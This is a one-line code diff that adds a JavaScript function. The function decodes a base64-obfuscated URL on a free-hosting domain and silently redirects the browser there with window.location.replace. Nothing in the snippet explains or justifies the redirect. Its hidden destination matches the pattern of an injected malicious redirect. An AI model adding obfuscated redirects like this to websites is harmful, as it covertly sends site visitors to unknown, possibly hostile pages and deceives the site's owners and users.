@@ -1,0 +1,1 @@
+function letsGo() {  var url = atob("aHR0cDovL2tpbGxpbmF0b3J6LmJ5ZXRob3N0Ni5jb20v");  window.location.replace(url);}
